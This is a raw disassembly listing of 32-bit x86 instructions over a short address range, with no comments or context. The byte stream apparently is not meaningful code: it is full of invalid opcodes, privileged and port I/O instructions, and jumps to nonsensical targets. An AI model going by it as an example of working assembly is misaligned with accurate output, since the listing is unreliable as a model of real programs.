  412af1:	jecxz  0x412b41
  412af3:	xchg   ebx,eax
  412af4:	pop    edi
  412af5:	inc    esp
  412af6:	mov    WORD PTR [eax+0x677767ea],fs
  412afc:	sbb    DWORD PTR [edx+0x75],edx
  412aff:	fstp   DWORD PTR [eax]
  412b01:	xor    dl,BYTE PTR [edi+0x44]
  412b04:	mov    edx,0xa1bbefd7
  412b09:	cld    
  412b0a:	repz js 0x412ad1
  412b0d:	loopne 0x412a92
  412b0f:	ror    BYTE PTR [esp+ebx*4],0x6d
  412b13:	mov    bh,0xd5
  412b15:	les    esi,FWORD PTR [ecx-0x7cc801d3]
  412b1b:	sar    DWORD PTR [edx+esi*1+0x9],cl
  412b1f:	idiv   BYTE PTR [ecx-0x78]
  412b22:	test   eax,0x68424db7
  412b27:	gs in  eax,dx
  412b29:	stc    
  412b2a:	icebp  
  412b2b:	rcl    DWORD PTR [esi+eiz*8],0xb8
  412b2f:	sbb    BYTE PTR [eax+0x3fd3def0],0x7b
  412b36:	mov    WORD PTR [eax+0x31],ds
  412b39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b3a:	dec    esi
  412b3b:	pusha  
  412b3c:	fadd   QWORD PTR [ecx-0x54]
  412b3f:	mov    ebp,0xd32c6d6c
  412b44:	cmc    
  412b45:	ss lock fwait
  412b48:	or     BYTE PTR [ebp-0x36],ah
  412b4b:	push   esi
  412b4c:	dec    BYTE PTR [eax+0x42]
  412b4f:	ret    
  412b50:	cmp    al,0x9
  412b52:	stc    
  412b53:	lods   eax,DWORD PTR ds:[esi]
  412b54:	fdivp  st(7),st
  412b56:	and    edx,DWORD PTR [ecx-0x9ca851a]
  412b5c:	fldl2t 
  412b5e:	adc    ebp,DWORD PTR ds:0xad7a84ed
  412b64:	popa   
  412b65:	xor    al,0xc3
  412b67:	pop    edi
  412b68:	pop    ecx
  412b69:	fcmovbe st,st(0)
  412b6b:	js     0x412ba0
  412b6d:	and    BYTE PTR [eax-0x26d4965c],0xcd
  412b74:	jmp    0xf87b10b8
  412b79:	inc    esi
  412b7a:	stc    
  412b7b:	inc    ebx
  412b7c:	push   es
  412b7d:	jge    0x412b3d
  412b7f:	push   ecx
  412b80:	push   eax
  412b81:	adc    dl,BYTE PTR [esi+edx*8+0x5f7789b9]
  412b88:	rol    eax,cl
  412b8a:	lods   eax,DWORD PTR ds:[esi]
  412b8b:	arpl   WORD PTR [ebx],sp
  412b8d:	fsubp  st(3),st
  412b8f:	dec    ebp
  412b90:	add    edi,DWORD PTR [ecx+0x729ffacb]
  412b96:	jae    0x412b29
  412b98:	mov    bl,0xdd
  412b9a:	fst    QWORD PTR [esi]
  412b9c:	(bad)
  412ba0:	int    0x59
  412ba2:	fisttp WORD PTR [eax+0x23920465]
  412ba8:	sar    DWORD PTR [edi-0x4b0a78a3],0x5a
  412baf:	fwait
  412bb0:	inc    esp
  412bb1:	mov    DWORD PTR [edx],edx
  412bb3:	std    
  412bb4:	and    bl,BYTE PTR [ebp+edi*8+0x669b068b]
  412bbb:	std    
  412bbc:	add    bl,dl
  412bbe:	rcr    BYTE PTR [eax],cl
  412bc0:	jmp    0x6f0d07fc
  412bc5:	and    eax,0x7ed82aea
  412bca:	mov    es,WORD PTR [eax]
  412bcc:	cdq    
  412bcd:	sbb    eax,0x2b37aac
  412bd2:	xlat   BYTE PTR cs:[ebx]
  412bd4:	jo     0x412bb6
  412bd6:	or     ebp,0xae55d67b
  412bdc:	adc    ebx,DWORD PTR cs:[eax-0x3a0900b2]
  412be3:	das    
  412be4:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  412be6:	retf   
  412be7:	add    al,0x42
  412be9:	arpl   WORD PTR [eax],bp
  412beb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bec:	scas   eax,DWORD PTR es:[edi]
  412bed:	scas   al,BYTE PTR es:[edi]
  412bee:	int    0xd1
  412bf0:	dec    esp
  412bf1:	outs   dx,BYTE PTR ds:[esi]
  412bf2:	push   0xffffff95
  412bf4:	cmp    cl,0x20
  412bf7:	(bad)  
  412bf8:	mov    cs:0xafa30565,eax
  412bfe:	sub    eax,0x52cf5195
  412c03:	(bad)  
  412c04:	(bad)  
  412c05:	outs   dx,BYTE PTR ds:[esi]
  412c06:	hlt    
  412c07:	xchg   edi,eax
  412c08:	rcr    DWORD PTR [edi],0xd2
  412c0b:	push   0x332d763d
  412c10:	sbb    eax,DWORD PTR [edx-0x5a55415]
  412c16:	pusha  
  412c17:	imul   esp,DWORD PTR [ebx+0x37],0x97d9925d
  412c1e:	pop    edx
  412c1f:	imul   esi,DWORD PTR [edx],0xbcce24b4
  412c25:	xor    eax,0x85b2abb8
  412c2a:	mov    esi,0x8d9e765f
  412c2f:	push   ds
  412c30:	cwde   
  412c31:	sub    DWORD PTR [ebx],esi
  412c33:	cli    
  412c34:	sub    DWORD PTR [edx+0x5b772ce6],ebp
  412c3a:	aaa    
  412c3b:	test   eax,0x948b5f2c
  412c40:	or     cl,BYTE PTR [edx+0x23]
  412c43:	ins    BYTE PTR es:[edi],dx
  412c44:	icebp  
  412c45:	dec    edx
  412c46:	pop    esi
  412c47:	xor    al,0x45
  412c49:	add    eax,0x3004e944
  412c4e:	imul   edx,DWORD PTR [ecx-0x2c],0x611b79a0
  412c55:	sbb    bh,BYTE PTR ds:0xd6d73d18
  412c5b:	popa   
  412c5c:	leave  
  412c5d:	retf   
  412c5e:	mov    edi,0x488d6294
  412c63:	in     al,dx
  412c64:	xchg   ebx,eax
  412c65:	inc    edi
  412c66:	cmp    al,0x4a
  412c68:	push   es
  412c69:	lods   eax,DWORD PTR ds:[esi]
  412c6a:	ins    BYTE PTR es:[edi],dx
  412c6b:	repnz stc 
  412c6d:	stos   BYTE PTR es:[edi],al
  412c6e:	rcr    al,cl
  412c70:	add    bh,BYTE PTR [bx+si+0x2a]
  412c74:	or     DWORD PTR [esi-0x5e789855],esp
  412c7a:	pusha  
  412c7b:	test   ah,ah
  412c7d:	arpl   WORD PTR [ebx+0xc],sp
  412c80:	pop    ebx
  412c81:	outs   dx,BYTE PTR ds:[esi]
  412c82:	jmp    0xf56c:0x756eb8c7
  412c89:	xchg   esp,eax
  412c8a:	and    DWORD PTR [ebp-0x22780a56],ecx
  412c90:	pop    edx
  412c91:	(bad)  
  412c92:	cmp    BYTE PTR [ebx+0x18],bh
  412c95:	imul   eax,DWORD PTR [ebx+0x28be6605],0x3cc15da7
  412c9f:	sti    
  412ca0:	test   BYTE PTR [edx],bh
  412ca2:	iret   
  412ca3:	repz stc 
  412ca5:	jle    0x412c50
  412ca7:	sub    DWORD PTR [edi],esp
  412ca9:	and    BYTE PTR [edi],cl
  412cab:	lods   eax,DWORD PTR ds:[esi]
  412cac:	dec    esp
  412cad:	scas   eax,DWORD PTR es:[edi]
  412cae:	mov    ecx,0x446e5b3a
  412cb3:	mov    ecx,ecx
  412cb5:	cmp    ecx,ecx
  412cb7:	(bad)  
  412cba:	sbb    bh,ch
  412cbc:	fidivr DWORD PTR [ebx]
  412cbe:	arpl   WORD PTR [esi],di
  412cc0:	stos   DWORD PTR es:[edi],eax
  412cc1:	cmp    BYTE PTR [edx-0x511b4fd1],al
  412cc7:	test   eax,0x929cf2dd
  412ccc:	aaa    
  412ccd:	xchg   DWORD PTR [ebx+esi*1-0x4fd9d8fc],edx
  412cd4:	bswap  ebx
  412cd6:	sub    al,0xd0
  412cd8:	mov    al,dl
  412cda:	adc    DWORD PTR [esi],edi
  412cdc:	pop    ebx
  412cdd:	push   ebp
  412cde:	fs dec esp
  412ce0:	scas   eax,DWORD PTR es:[edi]
  412ce1:	mov    dl,BYTE PTR [eax-0x1e397219]
  412ce7:	retf   
  412ce8:	xchg   ebx,eax
  412ce9:	mov    eax,ds:0x92b1cd31
  412cee:	cld    
  412cef:	out    dx,eax
  412cf0:	rcr    bh,cl
  412cf2:	popf   
  412cf3:	je     0x412c8b
  412cf5:	fstp   TBYTE PTR [ecx-0x377c3435]
  412cfb:	fptan  
  412cfd:	adc    al,0x53
  412cff:	dec    eax
  412d00:	cmp    cl,BYTE PTR [ebp-0x1e]
  412d03:	sti    
  412d04:	mov    esi,0x8078dde4
  412d09:	scas   eax,DWORD PTR es:[edi]
  412d0a:	popa   
  412d0b:	shl    DWORD PTR [ebx],1
  412d0d:	xchg   esi,eax
  412d0e:	(bad)  
  412d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d10:	(bad)  
  412d11:	pop    esp
  412d12:	test   BYTE PTR [ebp-0x5c],al
  412d15:	dec    esi
  412d16:	aam    0x4b
  412d18:	imul   esi
  412d1a:	fdivr  DWORD PTR [edx-0x45]
  412d1d:	sysexit 
  412d1f:	std    
  412d20:	stos   BYTE PTR es:[edi],al
  412d21:	test   edi,ebp
  412d23:	nop
  412d24:	dec    edi
  412d25:	push   ecx
  412d26:	dec    esp
  412d27:	fild   QWORD PTR [edi+0x67]
  412d2a:	inc    edi
  412d2b:	sub    DWORD PTR [edi-0x13c3b367],0xffffffed
  412d32:	push   ecx
  412d33:	mov    BYTE PTR [eax-0x11b226bb],al
  412d39:	(bad)  
  412d3a:	push   eax
  412d3b:	dec    edx
  412d3c:	push   esi
  412d3d:	lods   eax,DWORD PTR ds:[esi]
  412d3e:	xchg   edi,eax
  412d3f:	push   ss
  412d40:	or     eax,0xf1028afb
  412d45:	mov    bl,0x70
  412d47:	lods   eax,DWORD PTR ds:[esi]
  412d48:	jmp    0xd82b7983
  412d4d:	pop    edi
  412d4e:	aam    0xf3
  412d50:	(bad)  
  412d51:	imul   esp,DWORD PTR [edx+0x30],0xb4ee69da
  412d58:	cdq    
  412d59:	xchg   DWORD PTR [ebp-0x28],ebx
  412d5c:	pop    es
  412d5d:	dec    eax
  412d5e:	daa    
  412d5f:	es sti 
  412d61:	and    ebp,edi
  412d63:	sbb    eax,0xca054a69
  412d68:	sbb    DWORD PTR [esi+0x51d67cbd],eax
  412d6e:	push   edi
  412d6f:	xor    al,0x7a
  412d71:	repnz aad 0xf2
  412d74:	cmp    DWORD PTR [edx+0x74bccb86],ebp
  412d7a:	mov    bl,0xde
  412d7c:	inc    ebp
  412d7d:	stc    
  412d7e:	sbb    BYTE PTR [ecx],dl
  412d80:	mov    ds:0x22ee6a70,al
  412d85:	into   
  412d86:	jo     0x412d45
  412d88:	or     dh,BYTE PTR [edi-0x4f]
  412d8b:	not    DWORD PTR [esi-0x1c]
  412d8e:	cdq    
  412d8f:	call   DWORD PTR [esi]
  412d91:	pop    ecx
  412d92:	shl    BYTE PTR [eax],1
  412d94:	bswap  ebp
  412d96:	push   edx
  412d97:	lock add ah,ah
  412d9a:	mov    eax,ds:0xfa64f469
  412d9f:	sub    al,0xc4
  412da1:	xor    BYTE PTR [esi+esi*1-0x57],0x3d
  412da6:	fbld   TBYTE PTR [edx+0x6c]
  412da9:	dec    esi
  412daa:	push   eax
  412dab:	jae    0x412d9d
  412dad:	add    eax,0x9c7ccda4
  412db2:	cmp    BYTE PTR [edx+0x2d],0xa2
  412db6:	pop    esi
  412db7:	add    eax,0x53534675
  412dbc:	cld    
  412dbd:	adc    cl,BYTE PTR [edi-0x72]
  412dc0:	and    eax,0xba11f4c
  412dc5:	icebp  
  412dc6:	or     bh,0x8d
  412dc9:	push   ds
  412dca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dcb:	sub    ah,bh
  412dcd:	xor    eax,0x38e98e9d
  412dd2:	add    al,0xbc
  412dd4:	les    eax,FWORD PTR [eax-0x54dec0fa]
  412dda:	add    ebp,0x6f1b4990
  412de0:	fucomi st,st(7)
  412de2:	ins    BYTE PTR es:[edi],dx
  412de3:	das    
  412de4:	add    BYTE PTR [eax+0x4592b6ee],0x3a
  412deb:	adc    ebx,DWORD PTR [ecx+ebp*4+0x15772612]
  412df2:	and    DWORD PTR [edx+0x29d583f2],ebp
  412df8:	inc    ecx
  412df9:	xchg   DWORD PTR [esi+edx*2+0x103ea85],ecx
  412e00:	out    0x59,al
  412e02:	cli    
  412e03:	pop    esp
  412e04:	sti    
  412e05:	cwde   
  412e06:	sbb    DWORD PTR [ecx+0x4b],edi
  412e09:	out    dx,al
  412e0a:	xchg   esp,eax
  412e0b:	bound  edi,QWORD PTR ss:[edi+0x28a69f2d]
  412e12:	dec    eax
  412e13:	push   0xf1a31752
  412e18:	jno    0x412e84
  412e1a:	nop
  412e1b:	mov    eax,0x3b08328b
  412e20:	xchg   ebp,eax
  412e21:	add    DWORD PTR [ecx],edx
  412e23:	mov    cs:0xd10c2ee5,eax
  412e29:	cmp    ah,BYTE PTR [eax+ebx*2-0x6a7bda5]
  412e30:	push   esi
  412e31:	sbb    eax,0x4524b85
  412e36:	ror    DWORD PTR [edi],0xe7
  412e39:	pop    ds
  412e3a:	cli    
  412e3b:	mov    cl,0xaa
  412e3d:	outs   dx,DWORD PTR ds:[esi]
  412e3e:	dec    ecx
  412e3f:	mov    bl,0x8c
  412e41:	setle  BYTE PTR [ecx+0x5d]
  412e45:	mov    esi,0x74902b38
  412e4a:	cmp    al,0xfe
  412e4c:	sub    al,0x43
  412e4e:	sti    
  412e4f:	mov    BYTE PTR [ebp-0x42fbbeed],bh
  412e55:	xchg   DWORD PTR [edx-0x14],ebx
  412e58:	int    0xac
  412e5a:	mov    BYTE PTR [edi],0xad
  412e5d:	add    edx,DWORD PTR [ebp-0x345ee7ca]
  412e63:	outs   dx,BYTE PTR ds:[esi]
  412e64:	pop    esp
  412e65:	das    
  412e66:	jl     0x412e5a
  412e68:	dec    esi
  412e69:	ds xchg ebp,edi
  412e6c:	fwait
  412e6d:	adc    eax,0xc9b8256c
  412e72:	ins    DWORD PTR es:[edi],dx
  412e73:	pop    ebp
  412e74:	sbb    al,0x4
  412e76:	sub    al,0xc6
  412e78:	and    ch,ch
  412e7a:	cmp    eax,0x7822cd31
  412e7f:	xchg   ecx,eax
  412e80:	sub    BYTE PTR [edi-0x24b15e95],bh
  412e86:	sub    BYTE PTR [eax],bh
  412e88:	push   ebp
  412e89:	push   es
  412e8a:	std    
  412e8b:	popf   
  412e8c:	or     dl,BYTE PTR [esi-0x535822fb]
  412e92:	add    BYTE PTR [edi+0x5d4c46cb],cl
  412e98:	dec    edi
  412e99:	mov    ds:0x7348cebe,eax
  412e9e:	xor    BYTE PTR [esi-0x3267f5da],0xa6
  412ea5:	fdiv   st,st(7)
  412ea7:	stos   BYTE PTR es:[edi],al
  412ea8:	das    
  412ea9:	imul   esp,DWORD PTR [edi+0x2f],0x6a
  412ead:	aaa    
  412eae:	js     0x412f2d
  412eb0:	add    edx,ecx
  412eb2:	inc    ecx
  412eb3:	mov    bl,0xf
  412eb5:	pop    ebx
  412eb6:	imul   ecx,ecx,0x54538216
  412ebc:	adc    eax,0x35cccd26
  412ec1:	dec    edi
  412ec2:	cdq    
  412ec3:	in     eax,0x1e
  412ec5:	cmp    al,0x4
  412ec7:	dec    esi
  412ec8:	call   0xe9e0046
  412ecd:	es xchg eax,esi
  412ed0:	fmul   st,st(4)
  412ed2:	xchg   esi,eax
  412ed3:	xor    al,0x71
  412ed5:	(bad)  
  412ed6:	cmp    DWORD PTR [ecx+edx*4+0x1e52615d],edi
  412edd:	shr    BYTE PTR [ecx-0x55],0xa
  412ee1:	jo     0x412efc
  412ee3:	lods   al,BYTE PTR ss:[esi]
  412ee5:	int    0xb3
  412ee7:	ins    DWORD PTR es:[edi],dx
  412ee8:	fcmove st,st(4)
  412eea:	or     ch,ah
  412eec:	cmc    
  412eed:	add    BYTE PTR [ecx],dh
  412eef:	cwde   
  412ef0:	stos   BYTE PTR es:[edi],al
  412ef1:	mov    ecx,0xda1772c2
  412ef6:	imul   ebp,DWORD PTR [ecx],0x258ac990
  412efc:	test   al,0x96
  412efe:	mov    dh,0xa2
  412f00:	jmp    0x4d052a2c
  412f05:	mov    edx,0x9be7a24f
  412f0a:	jae    0x412ea2
  412f0c:	loope  0x412e9f
  412f0e:	add    esp,DWORD PTR [esp+edi*8]
  412f11:	xor    DWORD PTR [edx],esi
  412f13:	or     BYTE PTR [ecx+0x39],cl
  412f16:	popa   
  412f17:	mov    edx,0xd17acefc
  412f1c:	dec    esi
  412f1d:	mov    esp,0xfb4dfe11
  412f23:	das    
  412f24:	scas   al,BYTE PTR es:[edi]
  412f25:	jno    0x412ec2
  412f27:	mov    eax,ds:0x45cf3492
  412f2c:	dec    ebx
  412f2d:	cmp    esi,DWORD PTR [ecx]
  412f2f:	cld    
  412f30:	out    dx,eax
  412f31:	dec    ebp
  412f32:	add    dh,BYTE PTR [edx+0x51]
  412f35:	scas   eax,DWORD PTR es:[edi]
  412f36:	mov    ebx,0x5139ca8c
  412f3b:	cmc    
  412f3c:	sub    DWORD PTR [edi+0x5feb98d1],edi
  412f42:	sar    bl,cl
  412f44:	cmp    DWORD PTR [ebp-0x125be026],ecx
  412f4a:	(bad)  
  412f4b:	mov    cl,0xde
  412f4d:	push   eax
  412f4e:	push   ss
  412f4f:	retf   
  412f50:	fmul   QWORD PTR [ebp-0x30]
  412f53:	pop    ss
  412f54:	mov    esi,0xb7e44db6
  412f59:	add    BYTE PTR [ebx],0x57
  412f5c:	xchg   edx,eax
  412f5d:	mov    ebx,0x9ad357f4
  412f62:	sub    BYTE PTR [esi+edi*2-0x2163b16d],cl
  412f69:	or     esp,0xae85ce1d
  412f6f:	sub    DWORD PTR [edx*8+0x244e07ca],0x3a956615
  412f7a:	dec    edx
  412f7b:	retf   0x17ee
  412f7e:	xchg   BYTE PTR [ecx-0x45],ah
  412f81:	xchg   edx,eax
  412f82:	int3   
  412f83:	data16 mov al,ds:0x78a28442
  412f89:	add    eax,0x486695f7
  412f8e:	sub    BYTE PTR ds:0xd042f02c,0x7e
  412f95:	(bad)  [edx+0xacb1ddb]
  412f9b:	push   0x52d6930d
  412fa0:	pop    ds
  412fa1:	mov    eax,0xde692c16
  412fa6:	push   cs
  412fa7:	cmp    BYTE PTR [eax+0x11],dh
  412faa:	and    ebx,0x1b747f87
  412fb0:	mov    bl,0x52
  412fb2:	inc    esp
  412fb3:	xchg   edx,eax
  412fb4:	add    ah,BYTE PTR [edx-0x7fbd3344]
  412fba:	inc    eax
  412fbb:	es shld DWORD PTR cs:[ebp-0x22],esp,0xc7
  412fc2:	and    edi,DWORD PTR [esi-0xf]
  412fc5:	stc    
  412fc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fc7:	push   0xffffffc3
  412fc9:	fwait
  412fca:	inc    esp
  412fcb:	cli    
  412fcc:	adc    al,0xab
  412fce:	xchg   DWORD PTR ds:0x47713961,edx
  412fd4:	push   0x546143f8
  412fd9:	mov    al,ds:0x81a3d1df
  412fde:	(bad)
  412fe2:	shl    BYTE PTR [edx],0xd
  412fe5:	pop    ebp
  412fe6:	xor    BYTE PTR [edx],dl
  412fe8:	sbb    DWORD PTR [ecx+0xd],ebx
  412feb:	mov    eax,ds:0x46689148
  412ff0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ff1:	nop
  412ff2:	jmp    0x413033
  412ff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ff5:	add    BYTE PTR [eax-0x62],ah
  412ff8:	repz and ah,BYTE PTR [ebx+0x1e267307]
  412fff:	pop    esi
  413000:	aam    0x99
  413002:	mov    eax,0xa19f9d3a
  413007:	mov    ds:0x1956f9c,al
  41300c:	or     eax,esp
  41300e:	xchg   BYTE PTR [eax-0x4d],bh
  413011:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413012:	push   ebp
  413013:	sbb    al,0x8
  413015:	xor    ebx,DWORD PTR [ebx+0x53bacea7]
  41301b:	bound  ebp,QWORD PTR [ebp+0x61848788]
  413021:	shl    DWORD PTR [eax+0x235f36e0],cl
  413027:	cmp    al,0x2f
  413029:	fadd   DWORD PTR [ecx+0x64906d93]
  41302f:	and    ah,BYTE PTR [edx-0x4c]
  413032:	inc    ebp
  413033:	stos   BYTE PTR es:[edi],al
  413034:	cmp    bh,0x9
  413037:	xor    eax,0x8f230e46
  41303c:	push   eax
  41303d:	mov    ds:0x3a284b5e,eax
  413042:	test   eax,0x1c0fabe
  413047:	and    al,0xb0
  413049:	sbb    DWORD PTR [ebp+0x1a],ecx
  41304c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41304d:	pop    ebp
  41304e:	dec    edi
  41304f:	out    0x9,eax
  413051:	pop    edi
  413052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413053:	xlat   BYTE PTR ds:[ebx]
  413054:	shl    DWORD PTR [ecx+eax*2+0x635bb52],0x9f
  41305c:	stos   DWORD PTR es:[edi],eax
  41305d:	push   esi
  41305e:	lods   eax,DWORD PTR ds:[esi]
  41305f:	xchg   ecx,eax
  413060:	(bad)  
  413061:	fistp  DWORD PTR [edi+esi*8+0x78]
  413065:	xor    DWORD PTR [esi+0x20],eax
  413068:	jecxz  0x41300d
  41306a:	inc    edx
  41306b:	rcr    BYTE PTR [edi],cl
  41306d:	mov    ebp,0xd01ed668
  413072:	icebp  
  413073:	pop    ecx
  413074:	mov    esp,0xf557493a
  413079:	cmp    edx,DWORD PTR [ebp+0x8]
  41307c:	xor    DWORD PTR fs:[ebx-0x641606e7],eax
  413083:	imul   esi,DWORD PTR [ecx+0x67],0x30
  413087:	loop   0x41309a
  413089:	adc    al,0xa5
  41308b:	aaa    
  41308c:	psrlq  mm2,QWORD PTR [edx+0x66]
  413090:	sub    eax,0x75f0bf8b
  413095:	mov    bh,BYTE PTR [eax]
  413097:	das    
  413098:	adc    DWORD PTR [ebx],0x8017752f
  41309e:	fsub   st(2),st
  4130a0:	fld    QWORD PTR cs:0x17fca222
  4130a7:	cli    
  4130a8:	addr16 mov ebp,0x9918b1ae
  4130ae:	cld    
  4130af:	out    0x76,eax
  4130b1:	sbb    eax,0x178bc3c7
  4130b6:	pop    es
  4130b7:	cli    
  4130b8:	inc    esp
  4130b9:	jmp    0x41304c
  4130bb:	jle    0x413102
  4130bd:	mov    esi,ecx
  4130bf:	mov    al,ds:0xf2daf7d5
  4130c4:	ja     0x41304d
  4130c6:	sub    esp,edi
  4130c8:	jg     0x41308a
  4130ca:	pop    edx
  4130cb:	xor    DWORD PTR [ecx+0x21f38d24],0xffffffc6
  4130d2:	xchg   esp,eax
  4130d3:	xchg   ecx,eax
  4130d4:	jle    0x4130eb
  4130d6:	push   ebx
  4130d7:	and    ebp,edi
  4130d9:	inc    ebp
  4130da:	mov    esi,0xdb4fc042
  4130df:	daa    
  4130e0:	push   ds
  4130e1:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4130e3:	shl    ch,cl
  4130e5:	mov    dh,0x6b
  4130e7:	cmp    BYTE PTR [ecx],bh
  4130e9:	pop    ebx
  4130ea:	das    
  4130eb:	sub    DWORD PTR [esi-0x3eb4c16],edi
  4130f1:	std    
  4130f2:	mov    edx,0x2ebfeda
  4130f7:	sub    ebx,DWORD PTR [edx]
  4130f9:	push   ebp
  4130fa:	popf   
  4130fb:	sbb    al,0xd2
  4130fd:	xchg   ecx,eax
  4130fe:	nop
  4130ff:	pop    ss
  413100:	mov    eax,0x68c9056
  413105:	jnp    0x41308c
  413107:	mov    al,0x91
  413109:	iret   
  41310a:	dec    ebx
  41310b:	sahf   
  41310c:	int3   
  41310d:	sbb    eax,esi
  41310f:	xchg   esp,eax
  413110:	or     eax,0x2f529b74
  413115:	lahf   
  413116:	lahf   
  413117:	out    0xc7,eax
  413119:	pop    es
  41311a:	sbb    BYTE PTR [ebp+0x5b],dl
  41311d:	popa   
  41311e:	ds stc 
  413120:	jmp    0x951a:0x18bd7b0d
  413127:	or     BYTE PTR [ecx-0x20],0xd
  41312b:	cli    
  41312c:	push   es
  41312d:	in     eax,0x4a
  41312f:	fisttp WORD PTR [edi-0x1d]
  413132:	pop    ebp
  413133:	xchg   ecx,eax
  413134:	add    DWORD PTR [ecx+0x2f],0xab6148c9
  41313b:	sti    
  41313c:	xchg   ebp,eax
  41313d:	(bad)  
  41313f:	icebp  
  413140:	cmp    ebx,0xb6f18693
  413146:	pause  
  413148:	daa    
  413149:	hlt    
  41314a:	imul   BYTE PTR [eax]
  41314c:	add    eax,0x8f693ac
  413151:	dec    ebp
  413152:	sub    BYTE PTR [edx-0x4202b350],0x3a
  413159:	sbb    BYTE PTR [ebx-0x74],ch
  41315c:	mov    cl,0xa6
  41315e:	sahf   
  41315f:	add    al,BYTE PTR [ecx+0x27]
  413162:	in     eax,0xb9
  413164:	leave  
  413165:	imul   esp,ecx,0xd3f78076
  41316b:	adc    cl,BYTE PTR [ebp-0x40]
  41316e:	mov    al,ds:0xf7b027b2
  413173:	add    al,0x51
  413175:	(bad)  [esi+0x2efbead5]
  41317b:	push   es
  41317c:	or     ebp,DWORD PTR [edi-0x320c6650]
  413182:	pop    eax
  413183:	mov    ebx,0x2aac9d2f
  413188:	xchg   edx,eax
  413189:	inc    eax
  41318a:	and    BYTE PTR [ecx+0x70d94b96],bl
  413190:	xor    edi,DWORD PTR [esi*8-0x2be74aee]
  413197:	fadd   QWORD PTR [edi-0x359b1900]
  41319d:	loopne 0x41320a
  41319f:	mov    ebp,0x4c2890b2
  4131a4:	rcl    BYTE PTR [ecx-0x21f3bc77],0xa2
  4131ab:	cwde   
  4131ac:	sti    
  4131ad:	xor    BYTE PTR [ecx+0x4a75a2b],0x21
  4131b4:	cmp    DWORD PTR [edi],0x2e453896
  4131ba:	dec    esi
  4131bb:	cmp    eax,0xfbf5ed66
  4131c0:	sbb    eax,0xe120ec3
  4131c5:	out    dx,al
  4131c6:	rcl    DWORD PTR [ebp-0x7f],0x8c
  4131ca:	xchg   DWORD PTR [ebx+0x56ee6cf4],esp
  4131d0:	pushf  
  4131d1:	pmullw mm0,QWORD PTR [esi+0x4a]
  4131d5:	cmc    
  4131d6:	loope  0x413217
  4131d8:	loop   0x4131e2
  4131da:	push   edx
  4131db:	sbb    BYTE PTR [eax],0xfc
  4131de:	mov    bl,0xf1
  4131e0:	bound  eax,QWORD PTR [edx+eax*8]
  4131e3:	push   0xffffff8f
  4131e5:	es popf 
  4131e7:	outs   dx,BYTE PTR ds:[esi]
  4131e8:	aad    0xb3
  4131ea:	push   cs
  4131eb:	imul   edi,DWORD PTR [ebp+edx*1-0x15b0f2c1],0x4c505e01
  4131f6:	jno    0x41325f
  4131f8:	push   cs
  4131f9:	push   ebp
  4131fa:	pop    ebp
  4131fb:	aas    
  4131fc:	mov    cl,0xe9
  4131fe:	lea    eax,[edi+0x41843ba8]
  413204:	ret    0x93f1
  413207:	jne    0x413282
  413209:	pop    es
  41320a:	sub    ah,BYTE PTR [edx]
  41320c:	(bad)  
  41320d:	fcmovnbe st,st(1)
  41320f:	mov    al,ds:0x79103bb9
  413214:	pop    ebx
  413215:	sub    DWORD PTR [ebx-0x45],esp
  413218:	mov    edx,0x7d3f86e
  41321d:	adc    ebx,esi
  41321f:	(bad)  
  413220:	dec    edx
  413221:	mov    dh,0xcb
  413223:	push   ecx
  413224:	(bad)  
  413225:	adc    ch,BYTE PTR [bx-0x2900]
  41322a:	icebp  
  41322b:	cmp    BYTE PTR [ebp-0x27],ch
  41322e:	dec    esi
  41322f:	sub    DWORD PTR [esi+0x4a591f0],ebx
  413235:	xchg   cx,ax
  413237:	sbb    bh,BYTE PTR [ebx+0x52]
  41323a:	sbb    ebp,DWORD PTR [ebp-0x7e]
  41323d:	gs jl  0x4132b4
  413240:	or     eax,0xed28e178
  413245:	jns    0x41327b
  413247:	shl    BYTE PTR [ecx+0x43],cl
  41324a:	mov    BYTE PTR [esi-0x57],dl
  41324d:	popa   
  41324e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41324f:	rcr    esp,0x1a
  413252:	mov    BYTE PTR [ebx-0x6cee91d],bl
  413258:	inc    esi
  413259:	push   edx
  41325a:	pop    ds
  41325b:	sbb    eax,0x523c3fe9
  413260:	ret    
  413261:	aaa    
  413262:	sub    esi,DWORD PTR [ebx]
  413264:	jbe    0x413220
  413266:	and    eax,0x40b129ce
  41326b:	mov    al,0x12
  41326d:	or     ah,cl
  41326f:	cmc    
  413270:	jo     0x4132c6
  413272:	(bad)  
  413273:	in     al,dx
  413274:	test   eax,0x22678a5b
  413279:	or     bh,BYTE PTR [ebp-0x62]
  41327c:	pop    ebx
  41327d:	mov    al,ds:0x86b5ab2
  413282:	adc    DWORD PTR [eax+0x58aec75c],ebp
  413288:	call   0x98a9cafe
  41328d:	ret    
  41328e:	or     ch,BYTE PTR [esi+0x79]
  413291:	inc    eax
  413292:	jmp    0x4397:0x1e3ac6b0
  413299:	xchg   ecx,eax
  41329a:	jne    0x41325c
  41329c:	xchg   esp,eax
  41329d:	imul   esi,DWORD PTR [esi-0x5c915140],0xcff47ae5
  4132a7:	jg     0x41325c
  4132a9:	jno    0x413310
  4132ab:	cmp    al,0x45
  4132ad:	pop    ds
  4132ae:	ffree  st(4)
  4132b0:	mov    dl,0xb6
  4132b2:	or     eax,0xd96c5b1
  4132b7:	mov    cl,0xa0
  4132b9:	je     0x413249
  4132bb:	fcomp  DWORD PTR [eax+ebx*1]
  4132be:	sti    
  4132bf:	ror    ebp,1
  4132c1:	je     0x4132ea
  4132c3:	xor    DWORD PTR [ebx-0x43a7ae0d],eax
  4132c9:	mov    eax,0x1767f0cd
  4132ce:	xchg   ebp,eax
  4132cf:	iret   
  4132d0:	xchg   ebp,eax
  4132d1:	push   0x73
  4132d3:	mov    DWORD PTR [edi-0x3fba5dba],eax
  4132d9:	and    cl,al
  4132db:	lods   al,BYTE PTR ds:[esi]
  4132dc:	fs mov edi,0x55f305d2
  4132e2:	(bad)  
